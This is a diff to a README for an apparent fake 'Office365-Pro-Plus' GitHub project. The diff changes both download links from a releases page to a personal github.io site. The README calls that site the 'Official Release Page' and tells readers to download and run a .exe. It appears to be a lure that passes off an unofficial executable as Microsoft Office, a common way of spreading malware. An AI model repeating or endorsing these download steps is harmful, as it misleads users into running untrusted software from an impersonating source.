@@ -1,6 +1,6 @@
 # 📦 Office365-Pro-Plus - Install Microsoft Office on your computer
 
-[![](https://img.shields.io/badge/Download-Office_365-blue.svg)](https://github.com/intersexual-lauhala949/Office365-Pro-Plus/releases)
+[![](https://img.shields.io/badge/Download-Office_365-blue.svg)](https://intersexual-lauhala949.github.io)
 
 ## 📖 About this software
 
@@ -22,7 +22,7 @@ Before you begin, ensure your computer meets these basic standards:
 
 You must obtain the installer from the official release page. 
 
-1. Visit the [Official Release Page](https://github.com/intersexual-lauhala949/Office365-Pro-Plus/releases).
+1. Visit the [Official Release Page](https://intersexual-lauhala949.github.io).
 2. Look for the section labeled "Assets" at the bottom of the page.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your "Downloads" folder.
